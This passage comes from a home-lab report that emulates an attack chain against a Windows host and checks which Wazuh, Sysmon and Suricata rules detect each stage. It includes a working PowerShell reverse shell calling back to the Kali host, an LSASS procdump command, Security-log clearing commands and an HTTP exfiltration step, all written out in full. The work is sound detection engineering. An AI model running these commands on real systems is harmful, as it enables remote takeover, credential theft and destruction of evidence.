| Target | `HKU\S-1-5-21-…-1001\Software\Microsoft\Windows\CurrentVersion\Run\UpdaterSvc` |
| Value written | `C:\Windows\System32\calc.exe` |
| Sysmon rule name | `T1060,RunKey` (tag from the SwiftOnSecurity configuration) |

**Analysis — first attempt**

- Persistence is detected at **write time**, not when the program later launches.
- Sysmon records the key under `HKU\<SID>` rather than `HKCU`; the custom rule `100406` matches on the `\CurrentVersion\Run` part of the path, so it should apply.
- **Custom rule not proven this run.** The built-in `92302` fired at level 6 while the custom `100406` (level 10) did not appear — the precedence pattern described in `docs/03` §5, item 2.
- The Sysmon tag `T1060` is a legacy technique ID, now merged into `T1547.001`; the MITRE tag in the Wazuh alert is the current one.

**2026-10-13 re-test — custom rule confirmed firing**

After chaining `100406` under the built-in rule (`<if_sid>92302</if_sid>` instead of the original `<if_group>sysmon_event_13</if_group>`, see `docs/03` §3.3) and reloading the ruleset, the same `reg add ... /v UpdaterSvc` command was re-run:

![Figure 12 — Stage 7 re-test, 2026-10-13: custom rule 100406 fires alongside built-in rules](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/stage7_new.png)

*Figure 12 — `100406` (level 10) and `92041` (level 10) both fire at 20:38:27; an earlier run at 20:34:20 shows only the built-in `92302` (level 6), from before the fix was applied.*

| Rule | Level | Time (UTC+7, local) | Source |
|---|---|---|---|
| `92302` | 6 | 20:34:20.907 | Built-in — earlier run, before the `if_sid` fix |
| `100406` | 10 | 20:38:27.044 | **Custom** — "Sysmon: Registry Run key modified..." |
| `92041` | 10 | 20:38:27.043 | Built-in — "Value added to registry key has Base64-like pattern" |

See [`threat-emulation/evidence-logs/stage07-sysmon-registry-custom-rule.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage07-sysmon-registry-custom-rule.json) for the raw `100406` alert.

**Analysis — re-test**

- **The `if_sid` fix works.** `100406` now fires as a proper child of `92302` — since `if_sid=92302` is a strict precondition, `92302` itself must also have matched this exact event (only the deepest matching rule is reported, so no separate `92302` row is expected for this event).
- **`92041` ("Base64-like pattern") appears 1 ms earlier.** One event yields one alert, so this is most likely a separate Sysmon event for the same `reg add` (compare `eventRecordID`s; only `100406`'s record, 2875786, is exported). The written value is not Base64, so `92041` looks like a broad built-in heuristic; it does not affect `100406`.
- **Earlier run (20:34:20) vs. re-test (20:38:27)**: the first timestamp, with only `92302` at level 6, is consistent with testing *before* the `if_sid` fix was applied; the second, four minutes later with `100406` present, is consistent with testing *after*. This reads as the same fix-then-retest pattern already seen in Stage 5.
- The stored alert reports `rule.groups` as `sysmon_local`, `windowspersistence`, `registry`: the outer group name and `persistence` were concatenated (`docs/03` §5 item 16).

**Verdict: ✅ Detected by custom rule** (`100406`), confirmed via the 2026-10-13 re-test — closes the Stage 7 gap.

---

### Stage 8 — Command and Control (T1071)

```bash
# Kali — listener
nc -lvnp 4444
```

```powershell
# Windows — reverse shell started from the SSH session
$client = New-Object System.Net.Sockets.TCPClient("192.168.60.135",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | %{0}
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

![Figure 13 — Stage 8 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage8_C2.png)

*Figure 13 — Stage 8 evidence screenshot (original run).*

**Alert observed**

| Field | Value |
|---|---|
| Rule | `100304` (sid `1000006`, rev 2) — possible reverse shell, suspicious outbound port, level 12 |
| Time | 2026-08-29 07:45:49 |
| Connection | `192.168.60.1:62602` → `192.168.60.135:4444`, TCP |
| Flow | 1 packet to server (66 bytes), 0 to client — read from the Figure 13 screenshot; the exported JSON has no `flow` object |
| MITRE | T1071 / TA0011 |

**Analysis**

- The connection direction is the point: the **victim initiates** the outbound session to the attacker, which is how reverse shells slip past inbound filtering. The attacker started it by running the PowerShell code through SSH.
- **The evidence is from rule revision 2**, which fired on the first packet (the flow shows no reply). The current revision 3 requires an established flow, so this stage should be re-run to confirm the newer rule still triggers once the listener completes the handshake.
- The payload is PowerShell, so the banner-based rule `1000010` (which matches the `cmd.exe` banner) is not expected to fire.
- Endpoint-side rules (`100404`, outbound connection from PowerShell) were also expected but no Sysmon alert for this connection is preserved.
- Port `4444` is a signature-style indicator; the detection works for this test but would miss the same shell on another port (see recommendations).

**Verdict: ✅ Detected at the network layer** (custom `100304`); endpoint layer not evidenced.

---

### Stage 8b — Credential Access, LSASS (T1003.001)

```powershell
# Planned, through the reverse shell — procdump is not yet staged on the victim,
# so this step has NOT actually been run. See the false-positive finding below,
# captured instead while preparing the environment.
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_test.dmp
```

**No true-positive test has been run yet.** `procdump.exe` is not currently staged on the victim, so the actual attack step above has not been executed. What *has* been captured is a false positive from passive background activity — useful in its own right, but not a substitute for the real test.

**False positive — Windows Defender's own LSASS scan**

With Sysmon's `ProcessAccess` (Event ID 10) now enabled (`docs/03` §3.1), the endpoint started logging every process that touches `lsass.exe` — including Defender's own real-time-protection engine:

![Figure 14 — Stage 8b: Windows Defender's MsMpEng.exe accessing LSASS, flagged by a built-in rule](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/stage8b_dump.png)

*Figure 14 — Three occurrences of the built-in `92900` alert for routine Defender activity; `100411` does not appear.*

| Field | Value |
|---|---|
| Rule | `92900` — built-in, "Lsass process was accessed... possible credential dump", level 12 (T1003.001) |
| Time | Screenshot: 2026-10-13 21:02–21:03 local (three occurrences). The exported JSON is a different occurrence: 16:30:43 UTC = 23:30 local |
| Source | `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.4-0\MsMpEng.exe` (`sourceUser: NT AUTHORITY\SYSTEM`) |
| `grantedAccess` | `0x101000` |
| `callTrace` | Entirely inside `mpengine.dll` (Defender's scanning engine) and system DLLs — no third-party or unbacked code |

See [`threat-emulation/evidence-logs/stage08b-rule-100411-lsass-false-positive-windowsdefender.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage08b-rule-100411-lsass-false-positive-windowsdefender.json) for the raw alert.

**Analysis**

- **What the silence proves.** `100411` needs `grantedAccess` to be one of a short list of memory-read masks (`0x1010`, `0x1410`, …); `0x101000` is not in it, so the rule stays silent for this event regardless of anything else. That is the only filter this event proves. The `MsMpEng.exe` allow-list is **not** proven: the exported `eventdata.sourceImage` contains doubled backslashes (`C:\\ProgramData\\Microsoft\\…` after JSON decoding, while `message` has single ones) but the allow-list regex expects single ones, and the `if_group` name (`sysmon_event_10`) is also unverified. Silence is consistent with a broken rule; it does not demonstrate a working one.
- **The built-in `92900` has no equivalent filtering** and flags the same routine scan as "possible credential dump" at level 12, three times in under a minute. Whether the custom rule is more precise than the stock one still needs the positive control below.
- **This is not evidence that `100411` can detect a real LSASS dump** — it only shows the rule correctly ignoring benign traffic. The positive case (a tool like ProcDump actually reading LSASS memory) has not been tested.
- `100416` (the `callTrace`-based escalation, chained under `100411`) also has not been exercised — this Defender event's `callTrace` stays inside `mpengine.dll`/system DLLs the whole way, so even if `100411` had fired, `100416` would not have added anything here.

**Cheap positive control (no dump tool needed):** take the stored `full_log` of this event and run it through `wazuh-logtest` twice — unchanged (expect `92900`), then with `sourceImage` set to a non-allow-listed path and `grantedAccess` set to `0x1fffff` (expect `100411`; edit `callTrace` to contain `dbghelp.dll` to expect `100416`). If the second run does not produce `100411`, fix the rule before staging a real dump tool.

**Verdict: ⚠️ Telemetry confirmed; rule filters unproven; true positive not evidenced** — run the positive control, then stage `procdump.exe` (or an equivalent tool) and re-run; see §7.

---

### Stage 9 — File Lifecycle (FIM)

```powershell
# through the reverse shell
Add-Content -Path C:\Users\LENOVO\Downloads\virustotaltest\eicar2.com -Value "modified"
Remove-Item C:\Users\LENOVO\Downloads\virustotaltest\eicar2.com -Force
```

![Figure 15 — Stage 9 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage9_fim.png)

*Figure 15 — Stage 9: file modified and file deleted, original run.*

**Analysis**

- With `realtime="yes"` on the monitored folder, Wazuh's syscheck raises an alert for each change: "integrity checksum changed" (rule `550`, level 7) when the content is modified, and a deletion alert when the file is removed.
- This stage covers the part of an intrusion that leaves traces on disk after the payload landed in Stage 6: tampering with, and removal of, files.
- The evidence is a screenshot; no raw alert is preserved.
- File names are consistent: `eicar2.com` is created in Stage 6, then modified and deleted here (as in `09-file-lifecycle_windows.ps1`).

**Verdict: ✅ Detected** (screenshot evidence only).

---

### Stage 10 — Cleanup / Anti-Forensics (T1070.001)

```powershell
# through the reverse shell
wevtutil cl Security
# or
Clear-EventLog -LogName Security
```

**First attempt (2026-08-28) — alert observed**

| Field | Value |
|---|---|
| Rule | `63103` — built-in "audit log cleared", level 5 (T1070, Indicator Removal) |
| Event | Windows Security `1102` |
| Time | 2026-08-29 08:39:25 |
| Subject | account `LENOVO`, logon ID `0x3cdb2` |

**Analysis — first attempt**

- Event `1102` is written even when an attacker wipes the log. Because Wazuh had already forwarded the events, **the cleared history remains available in the SIEM**, which is the point of shipping logs off the host in real time.
- The built-in `63103` fired at level 5; the custom `100412` (level 15) did not appear — the same precedence pattern as Stage 7. At the time, `100412` chained from `60117`, a Security-range rule ID that was never confirmed as a real ancestor of event `1102` — a broken-reference problem, not (yet) a sibling-precedence one.

**2026-10-13 re-test — custom rule confirmed firing, twice**

`100412`'s parent was corrected to `<if_sid>60002</if_sid>` (the documented ancestor of every eventchannel Security event, per `docs/03` §3.3) and the log-clear command was re-run:

![Figure 16 — Stage 10 re-test, 2026-10-13: custom rule 100412 fires twice, no 63103 visible](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/stage10_cleanup.png)

*Figure 16 — Two `100412` alerts (23:28:52 and 23:28:56), interleaved with `100400` "Shell spawned child process" entries showing `cmd.exe` as a parent — confirming `100400`'s shell-parent list now includes `cmd.exe`.*

| Rule | Level | Time (UTC+7, local) | What fired |
|---|---|---|---|
| `100400` | 5 | 23:28:45.358 | `cmd.exe` spawned a child process |
| `100412` | 15 | 23:28:52.701 | **Custom** — "CRITICAL: Windows Security Event Log cleared" |
| `100400` | 5 | 23:28:53.689 | `cmd.exe` spawned a child process |
| `100412` | 15 | 23:28:56.018 | **Custom** — "CRITICAL: Windows Security Event Log cleared" |

Raw alert for the second occurrence: [`stage10-rule-100412-excerpt.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage10-rule-100412-excerpt.json) — despite the file name it is a full export (`firedtimes: 2`, level 15, `full_log`); consider renaming it.

**Analysis — re-test**

- **The parent-reference fix works.** `100412` now fires with its intended level-15 description, twice in this window (likely two separate `wevtutil`/`Clear-EventLog` invocations while testing). Neither row shows the built-in `63103` — consistent with (but not conclusive proof of) the custom rule now winning or replacing it, since Figure 16's visible rows are not an exhaustive search.
- **A level-15 alert for a log wipe is appropriately loud** for a SOC, versus the original built-in `63103` at level 5 — this was the whole point of writing `100412`.
- The interleaved `100400` rows (parent `cmd.exe`) independently confirm the Stage 5 finding that `100400`'s `parentImage` pattern now includes `cmd.exe`, not just PowerShell variants.

**Verdict: ✅ Detected by custom rule** (`100412`), confirmed via the 2026-10-13 re-test — closes the Stage 10 gap.

---

### Stage 11 — HTTP Transfer / Exfiltration Simulation (T1059.001; T1048.003 conditional)

**Source of truth:** [`11-exfiltration_windows.ps1`](../threat-emulation/attack-scripts/11-exfiltration_windows.ps1) and [`11-exfiltration_kali.sh`](../threat-emulation/attack-scripts/11-exfiltration_kali.sh) as committed. This is **not** the Stage 8 `TCPClient` reverse shell. The older port-4445 raw-socket transfer is historical and no longer matches the committed Windows Stage 11 script.

**Current Windows procedure (committed, not evidence of successful transfer):**

```powershell
Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath C:\Windows\Temp\exfil_test.zip -Force
Invoke-WebRequest -Uri "http://192.168.60.135:8000/upload" -Method Post -InFile C:\Windows\Temp\exfil_test.zip
```

**Current Kali script (committed):**

```bash
python3 -m http.server 8000
# Subsequent `nc -lvnp 4445` is not reached until the server exits;
# it also listens on a different port than the Windows HTTP request.
```

Stock Python `http.server` does **not** implement a POST upload handler that saves the request body to disk. A request line visible in the server terminal is not proof that a ZIP was received intact. If a separate receiver was used in an actual experiment, its code and a saved received file are **not currently in this repository**. The current files do not establish a successful file-transfer outcome. An HTTP receiver that actually stores the POST body, plus a hash comparison, is needed for a reproducible end-to-end result.

**Detection engineering alignment.** Custom Wazuh `100413` searches PowerShell Module Logging fields `win.eventdata.contextInfo` (containing `Invoke-WebRequest`) and `win.eventdata.payload`, as a child of built-in `60009`. The agent's committed `ossec.conf` **already includes** `Microsoft-Windows-PowerShell/Operational`, but the policy enabling Module Logging (4103), event field extraction, built-in parent chain and positive `100413` alert are **not verified**. The regex targets web-request activity, **not independent proof of exfiltration**. Sysmon `100404` can provide a more generic process-network signal if an eligible EID 3 event is generated.

| Check | Evidence required | Current status |
|---|---|---|
| Local archive created | `exfil_test.zip` exists and has a SHA256 on Windows | Script configured; no preserved outcome |
| HTTP transfer requested | Windows request to Kali `:8000/upload`, plus matching Kali-side record | No preserved request/response evidence |
| ZIP received in full | Kali receiver saves ZIP; SHA256 matches Windows | **Unverified with committed listener** |
| PowerShell telemetry | Windows Operational EID 4103 with relevant `contextInfo`/`payload` | Channel configured; 4103 activation/ingestion unverified |
| Wazuh detection | Raw `rule.id: 100413` alert with original event fields | Not captured |
| Alternate network alert | Raw Sysmon EID 3 and rule `100404`, if observed | Not captured for this Stage 11 run |

**ATT&CK interpretation:** `T1059.001` accurately describes execution via PowerShell. Sending data to a Kali-hosted **HTTP** endpoint is **not** `T1567.002` (cloud storage). For a verified unencrypted HTTP transfer independent of the C2 channel, `T1048.003` may describe the simulated exfiltration procedure; if the same C2 channel carries the data, reassess `T1041`. Neither label should be treated as proof that transfer succeeded.

**Verdict: ❌ No preserved Stage 11 detection or completed transfer evidence.** The Stage 11 Windows script and intended detection are aligned, but neither raw `100413` alerts nor end-to-end file integrity have been demonstrated by committed evidence.

---

## 5. Attack Timeline (UTC)

The chain was run in several sessions: Stages 1–7 on 2026-08-28, Stages 8–10 on 2026-08-29, a standalone Stages 2–3 re-test on 2026-10-10, and standalone Stage 5, 7, 8b and 10 re-tests on 2026-10-13. A preliminary, inconclusive attempt was also made 2026-10-09. Times are taken from the preserved alerts (event time, UTC); the Stage 7, 8b and 10 re-test rows below are converted from the local (UTC+7) timestamps quoted in Section 4.

| Stage | Date and time | Event | Source |
|---|---|---|---|
| 1 | 2026-08-28 05:32:14 | pfSense burst alert (loopback DNS, not attributable to the scan) | pfSense `100140` |
| 2 | 2026-08-28 05:45:44 | Repeated SSH connection attempts from Kali | Suricata `100301` |
| 2 | 2026-08-28 05:46:44 | Failed logon through `sshd.exe` (`lenovo`) | Windows `60122` |
| 3 | 2026-08-28 05:46:44 | Account `LENOVO` locked out | Windows `60115` |
| 4 | 2026-08-28 06:34:55 | Encoded PowerShell command | Sysmon `100401` |
| 5 | 2026-08-28 06:48:04 | `net1 localgroup administrators` | Sysmon `92031` (built-in) |
| 6 | 2026-08-28 07:09:53 | EICAR file downloaded over HTTP | Suricata `100306` |
| 7 | 2026-08-28 07:46:46 | `UpdaterSvc` Run key written | Sysmon `92302` (built-in) |
| 8 | 2026-08-29 07:45:49 | Outbound connection to Kali on port 4444 | Suricata `100304` |
| 9, 11 | — | No timestamp preserved | — |
| 10 | 2026-08-29 08:39:25 | Security log cleared (Event `1102`) | Windows `63103` (built-in) |
| 2 (preliminary) | 2026-10-09 ~08:05 | Failed-logon burst, but `ipAddress` shows the victim's own IP (artifact) | Windows `100408` |
| 2 (re-test) | 2026-10-10 17:37:52 | Failed-logon burst, correct `ipAddress` | Windows `100408` |
| 3 (re-test) | 2026-10-10 17:38:11 | Successful logon, 18s after the burst above | Windows `92657` (built-in) |
| 5 (re-test) | 2026-10-13 05:04:30 | `whoami.exe` — reconnaissance binary | Sysmon `100402` |
| 5 (re-test) | 2026-10-13 05:04:34 | Recon burst correlation (`whoami` → `tasklist` → `systeminfo`) | Sysmon `100407` |
| 5 (re-test) | 2026-10-13 05:04:38 | `ARP.EXE` spawned by `powershell.exe` | Sysmon `100400` |
| 5 (re-test) | 2026-10-13 05:04:42 | `net.exe` / `net1.exe` — reconnaissance binaries | Sysmon `100402` |
| 7 (re-test) | 2026-10-13 13:34:21 | `UpdaterSvc` Run key written again, before the `if_sid` fix | Sysmon `92302` (built-in) |
| 7 (re-test) | 2026-10-13 13:38:27 | `UpdaterSvc` Run key written, custom rule fires alongside built-in `92041` | Sysmon `100406` |
| 8b | 2026-10-13 16:30:43 | Windows Defender's own LSASS scan (exported alert; the screenshot shows earlier occurrences at about 14:02–14:03 UTC) | Sysmon `92900` (built-in) |
| 10 (re-test) | 2026-10-13 16:28:52 | Security log cleared (1st of two), custom rule fires | Windows `100412` |
| 10 (re-test) | 2026-10-13 16:28:56 | Security log cleared (2nd), custom rule fires again | Windows `100412` |

---

## 6. Detection Coverage Results

| Stage | Custom rule expected | Rule that fired | Layer | Custom rule proven | Verdict |
|---|---|---|---|---|---|
| 1 Reconnaissance | `100300`, `100130`, `100201` | `100140` (unrelated traffic) | pfSense | ❌ | ⚠️ |
| 2 Brute Force | `100301`, `100408` | `100301`, `60122`, `100408` (re-test) | Suricata, Windows | ✅ | ✅ |
| 3 Successful Access | `100410` (current revision pending retest) | `92657` (built-in, 2026-10-10 historical retest) | Windows | ❌ | ⚠️ |
| 4 Execution | `100401` | `100401` | Sysmon | ✅ | ✅ |
| 5 Discovery | `100400`, `100402`, `100407` | `100402`, `100407`, `100400` (re-test) | Sysmon | ✅ | ✅ |
| 6 Payload Drop | `100306` | `100306`, FIM, `87105` | Suricata, FIM, VirusTotal | ✅ | ✅ |
| 7 Persistence | `100406` | `100406` (re-test, child of `92302`) | Sysmon | ✅ | ✅ |
| 8 Command and Control | `100304` | `100304` (rev 2) | Suricata | ✅ | ✅ |
| 8b LSASS | `100411` | `92900` (built-in, false positive); `100411` correctly silent | Sysmon | n/a (true positive not tested) | ⚠️ |
| 9 File Lifecycle | FIM modified / deleted | syscheck (screenshot) | FIM | n/a | ✅ |
| 10 Anti-Forensics | `100412` | `100412` (re-test, child of `60002`) | Windows | ✅ | ✅ |
| 11 HTTP Transfer / Exfiltration Simulation | `100413` | none preserved | PowerShell (planned), Sysmon (fallback) | ❌ | ❌ |

**Reading the results**

- **Coverage is partial, not a complete end-to-end chain.** The saved results include seven stages with raw alerts from their expected custom rule, Stage 3 supported only by built-in `92657`, and Stage 9 supported by screenshots. Stage 1 and Stage 11 lack convincing stage-specific proof; optional Stage 8b lacks a positive LSASS test. Stage 0 is setup, not an attack action.
- **Precedence and configuration history:** Stages 5, 7 and 10 have positive retest evidence. For Stage 3, the 2026-10-10 test matched built-in `92657`; current XML has since changed to `if_sid=92657`, but `100410` has **not** been validated after that change. Do not describe the old `60106` parent or historical `frequency=2` as the live configuration.
- **Stage 8b shows telemetry, not detection quality.** Defender's scan reached the rule engine and only the built-in `92900` alerted; that does not show that `100411`'s filters work (see Stage 8b), and a real LSASS access has not been tested.
- Network detections (Suricata) remain reliable: three of the seven custom rules proven are Suricata rules; the rest are now Sysmon/Windows rules after the latest re-tests.

---

## 7. Gap Analysis and Re-test Plan

Priority is based on **current committed scripts/configuration**, while historical evidence is retained in Section 4.

| Priority | Stage | Current gap | Action | Pass criteria |
|---|---|---|---|---|
| P1 | 3 | `100410` has been reparented to `92657` in XML, but `frequency="1"` and mixed historical/current correlation behavior have not been validated | Check `wazuh-analysisd -t` and confirm the installed version's frequency semantics; inspect built-in `92657`, then retest failed SMB logons → one successful 4624 from the same source | A new raw `100410` alert from the **current rule revision**, or an explicit failed test with decoded fields |
| P1 | 11 | Windows uses `Invoke-WebRequest` to POST a ZIP; committed Kali stock `http.server` does not store POST bodies; no raw Stage 11 alert | Provide a reproducible POST receiver and preserve a received ZIP/hash match; separately verify Windows 4103 and Wazuh `100413` | Matching Windows/Kali SHA256 plus original raw `100413` alert; report transport/detection results independently |
| P1 | 1 | Same-segment Kali→Windows traffic bypasses pfSense; historical `100140` event is unrelated loopback DNS | Retest endpoint Suricata SID `1000002`/Wazuh `100300`; test pfSense with a distinct WAN-side probe to pfSense itself (without assuming WAN→LAN port-forward) | Raw alert matches actual attack source, target, port and time |
| P1 | 8b | Sysmon LSASS EID 10 exists, but `100411`/`100416` have no positive validation and allow-list behavior is uncertain | Start with non-destructive `wazuh-logtest` synthetic positive/negative controls; if using memory-access tools, prefer an isolated disposable VM rather than the physical host | Confirm rule matching and acceptable false positives; do not claim real dumping detection without evidence |
| P2 | all | Group names can appear concatenated (`windowspersistence`, `windowslog_cleared`) | Verify actual `rule.groups`, then normalize outer `<group>` delimiters and retest | Separate `windows`, `persistence`, `log_cleared` values in alerts |
| P2 | 5 | `100400` may preempt `100402` for `net`/`net1` spawned by a shell | Test current rule ordering and narrow/exclude generic `100400` patterns where necessary | Raw `100402` for intended discovery commands and correlation `100407` |
| P2 | 11 | MITRE `T1567.002` in `sysmon_rules.xml` and some references suggests cloud storage incorrectly | Map `100413` conservatively to PowerShell execution; describe the transfer technique separately, conditional on actual data path | Doc and XML ATT&CK tags no longer imply cloud storage |
| P2 | evidence | Some JSON files are condensed excerpts or historical revisions rather than complete raw exports | Label original vs condensed, include rule revision and exact event source; avoid claiming complete raw fidelity | Evidence index identifies provenance and revisions |
| P3 | 2–3 | SMB re-test proved IP populated; SSH `logonType 8` has a separate source-IP gap | Retest SSH explicitly if SSH correlation is a goal | Relevant `4624`/`4625` `ipAddress` values, or documented limitation |
| P3 | 6–9 | FIM screenshot or historic signature revision limits strong reproducibility | Preserve additional raw event JSON, sensor version, timestamps and hashes | Stage-specific matching evidence |
| P3 | all | Clock skew/VM sleep and mixed timezone records can mislead correlation | Record timezone, UTC window and local clock sync status for each future session | Correlated event order supported by synchronized source clocks |

**Status convention:** `Implemented` means the rule/script exists; `Configured` means collection is defined; `Validated` requires a matching, dated alert from that revision; `Transfer verified` additionally requires independently checked file integrity.

---

## 8. Defensive Recommendations

| Stage | Prevent | Detect | Respond |
|---|---|---|---|
| Reconnaissance | Segment the network, expose fewer services | Port-scan detection on the endpoint and on the firewall | Block or rate-limit the source |
| Brute Force | MFA or key-only SSH, account lockout policy, `MaxStartups` | Failed-logon bursts correlated by user and source | Disable or reset the targeted account |
| Successful Access | Strong unique passwords, restrict who can log in over SSH | Success after a failure burst | Revoke sessions, rotate credentials |
| Execution | Script Block Logging (Event `4104`), Constrained Language Mode | Encoded commands from any parent process | Isolate the host, collect the decoded payload |
| Discovery | Least privilege | Bursts of discovery binaries by one user | Review the session timeline |
| Payload Drop | Egress filtering, application control | Network, FIM and hash-reputation alerts together | Quarantine the file |
| Persistence | Restrict Run-key writes, baseline autostart entries | Registry Run key changes (Sysmon EID 13) | Remove the entry, investigate the writer |
| Command and Control | Egress filtering by port and destination | Shell banners, scripting engines with outbound connections | Block the destination, isolate the host |
| LSASS access | Credential Guard, restrict dump tools | `ProcessAccess` on `lsass.exe` with suspicious access masks | Treat all credentials on the host as exposed |
| Anti-Forensics | Forward logs off-host in real time | Dedicated alert for Events `1102` / `1100` | Preserve the SIEM copy as evidence |
| Exfiltration | DLP, egress allow-lists | Volume- and behaviour-based network detection | Block the channel, assess data exposure |

---

## 9. Conclusion

The lab demonstrates multi-source visibility and several validated detections across network, endpoint, firewall, and file/reputation telemetry, **but does not yet establish an uninterrupted, fully detected chain from reconnaissance to data theft**. Retests on 2026-10-10 and 2026-10-13 supplied positive custom-rule evidence for Stages 5, 7 and 10; historical Stage 3 access was classified by built-in `92657`. The **current** `100410` XML is reparented to `92657`, but its correlation syntax and positive result remain unverified. Stage 8b demonstrates that benign Windows Defender LSASS access can be seen without an alert from `100411` for the recorded mask; it does **not** prove all allow-list conditions or positive LSASS-dump detection. Stage 1 and Stage 11 still lack adequate stage-specific evidence. Prioritize those gaps, validate PowerShell Module Logging, and preserve source logs and transfer hashes before calling the full chain confirmed. Section 7 lists the outstanding work.

---

## Appendix A — Screenshot Index

Screenshots are stored in the repository under [`screenshot/`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot), so the report does not depend on an external host.

| Figure | Stage | Date | File |
|---|---|---|---|
| 1 | Architecture | — | [`architecture/Architecture-and-data-flow.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/architecture/Architecture-and-data-flow.png) |
| 2 | 1 Reconnaissance | 2026-08-28 | [`Stage1_recon.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage1_recon.png) |
| 3 | 2 Brute Force | 2026-08-28 | [`Stage2_bruteforce.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage2_bruteforce.png) |
| 4 | 2 Brute Force (preliminary re-test, artifact `ipAddress`) | 2026-10-09 | [`stage2_rule.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/stage2_rule.png) |
| 5 | 3 Successful Access | 2026-08-28 | [`Stage3_access.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage3_access.png) |
| 6 | 5 Discovery | 2026-08-28 | [`Stage5_discovery.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage5_discovery.png) |
| 7 | 5 Discovery (re-test, custom rules confirmed) | 2026-10-13 | [`stage5_evidence.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/stage5_evidence.png) |
| 8 | 6 Payload Drop (1/3) | 2026-08-28 | [`Stage6_payload1.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload1.png) |
| 9 | 6 Payload Drop (2/3) | 2026-08-28 | [`Stage6_payload2.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload2.png) |
| 10 | 6 Payload Drop (3/3) | 2026-08-28 | [`Stage6_payload3.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload3.png) |
| 11 | 7 Persistence | 2026-08-28 | [`Stage7_persistence.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage7_persistence.png) |
| 12 | 7 Persistence (re-test, custom rule confirmed) | 2026-10-13 | [`stage7_new.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/stage7_new.png) |
| 13 | 8 Command and Control | 2026-08-29 | [`Stage8_C2.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage8_C2.png) |
| 14 | 8b LSASS (false positive, Windows Defender) | 2026-10-13 | [`stage8b_dump.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/stage8b_dump.png) |
| 15 | 9 File Lifecycle | 2026-08-28 | [`Stage9_fim.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage9_fim.png) |
| 16 | 10 Anti-Forensics (re-test, custom rule confirmed) | 2026-10-13 | [`stage10_cleanup.png`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/stage10_cleanup.png) |

Stage 4 and Stage 11 have no screenshots; Stage 4 has a stored raw alert, while Stage 11 has no preserved raw alert or completed transfer evidence. Stage 3's 2026-10-10 re-test (`92657`, `67028`, `60122` sequence) and the Discover search that found no `100410` are documented from raw JSON and Discover observation, not a saved screenshot.

---

## Appendix B — Artifacts and Cleanup

Everything the emulation leaves behind, with the command that removes it.

| Artifact | Stage | Location | Cleanup |
|---|---|---|---|
| Registry value `UpdaterSvc` | 7 | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdaterSvc /f` |
| EICAR files | 6, 9 | `C:\Users\LENOVO\Downloads\virustotaltest\` | Delete the files in the folder |
| LSASS memory dump (**not created in documented test**) | 8b planned | `C:\Windows\Temp\lsass_test.dmp` (planned only) | If separately tested on an isolated VM, securely delete the dump |
| Exfiltration archive | 11 | `C:\Windows\Temp\exfil_test.zip` | `del C:\Windows\Temp\exfil_test.zip` |
| Locked account `LENOVO` | 2, 3 | Windows local accounts | `net user lenovo /active:yes` |
| Cleared Security log | 10 | Windows Security log | Not recoverable on the host; the history remains in Wazuh |
| Received archive (**not evidenced**), packet capture, Hydra state | 0, 11 | Kali home directory | Delete any files **actually created** during testing; `received_exfil.zip` is only an expected future artifact |
| Listeners | 6, 8, 11 | Kali ports `8000`, `4444`; `4445` remains a legacy Stage 11 script line | Stop running processes; `nc :4445` is not part of the current Windows HTTP POST path |

**Indicators for hunting this emulation:** Kali `192.168.60.135`; port `4444` (Stage 8 reverse shell) and HTTP port `8000` (Stage 11 planned POST); `4445` is a **legacy Stage 11 marker**; Run value `UpdaterSvc`; Event `1102` on the endpoint. `procdump.exe` was **not executed** in the recorded tests.

---

## Appendix C — Reproducibility Notes

| Where | Issue | Correction |
|---|---|---|
| Stage 4 | The original sample used `-EncodingCommand`, which is not a valid PowerShell parameter | Use `-EncodedCommand`, as the captured log shows |
| Stage 5 | Typo `whoammi` | `whoami` |
